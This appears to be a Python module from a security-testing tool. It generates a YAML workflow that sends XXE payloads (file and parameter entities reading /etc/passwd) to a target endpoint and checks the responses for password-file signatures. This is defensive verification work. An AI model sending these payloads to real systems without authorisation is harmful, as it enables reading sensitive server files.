"""XXE test blueprint — generates flyto-core YAML.

Sends XML with an external entity referencing /etc/passwd or HTTP out-of-band.
If the server expands the entity and echoes its content, exploitable.
"""
from __future__ import annotations

import yaml

from ..schema import SecurityFinding


_XXE_SIGNATURES = [
    "root:x:0:0",
    "daemon:x:",
    "bin:x:",
    "<!ENTITY",   # server echoes unparsed entity → parser disabled, sanitized
]


def generate(finding: SecurityFinding, target_url: str, auth_token: str | None) -> str:
    method = (finding.http_method or "POST").upper()
    path = finding.endpoint_path or "/xml"
    url = f"{target_url}{path}"

    xxe_file = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
        '<root><data>&xxe;</data></root>'
    )
    xxe_param = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [ <!ENTITY % p SYSTEM "file:///etc/passwd"> %p; ]>'
        '<r/>'
    )
    benign = '<?xml version="1.0"?><r><data>hello</data></r>'

    headers = {"Content-Type": "application/xml"}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    probe_requests = [
        {"method": method, "url": url, "headers": headers, "body": benign, "label": "baseline"},
        {"method": method, "url": url, "headers": headers, "body": xxe_file, "label": "file_entity"},
        {"method": method, "url": url, "headers": headers, "body": xxe_param, "label": "param_entity"},
    ]

    workflow = {
        "id": "verify_xxe",
        "name": f"XXE Verify at {path}",
        "version": "1.0.0",
        "description": f"Auto-generated XXE verification at {finding.source_file}:{finding.source_line}",
        "timeout": 120,
        "steps": [
            {"id": "start", "module": "flow.start", "label": "Start", "params": {}, "orderIndex": 0},
            {
                "id": "xxe_probes",
                "module": "http.batch",
                "label": "XXE Probes",
                "params": {
                    "description": "Baseline + 2 XXE payloads (file entity, parameter entity)",
                    "requests": probe_requests,
                    "timeout": 15,
                    "ssrf_protection": False,
                    "detect_patterns": _XXE_SIGNATURES,
                },
                "orderIndex": 1,
            },
            {
                "id": "assert_xxe",
                "module": "test.assert_contains",
                "label": "Assert XXE Exploitable",
                "params": {
                    "source": "${xxe_probes.items}",
                    # Only /etc/passwd markers indicate actual file read.
                    "patterns": ["root:x:0:0", "daemon:x:", "bin:x:"],
                    "match_mode": "any",
                    "on_match": "exploitable",
                    "on_no_match": "sanitized",
                },
                "orderIndex": 2,
            },
            {
                "id": "report",
                "module": "output.display",
                "label": "Report",
                "params": {
                    "format": "json",
                    "data": {
                        "result": "${assert_xxe.data}",
                        "finding_source": f"{finding.source_file}:{finding.source_line}",
                        "finding_sink": f"{finding.sink_file}:{finding.sink_line}",
                    },
                },
                "orderIndex": 3,
            },
        ],
        "edges": [
            {"source": "start", "target": "xxe_probes"},
            {"source": "xxe_probes", "target": "assert_xxe"},
            {"source": "assert_xxe", "target": "report"},
        ],
    }
    return yaml.dump(workflow, default_flow_style=False, allow_unicode=True, sort_keys=False)
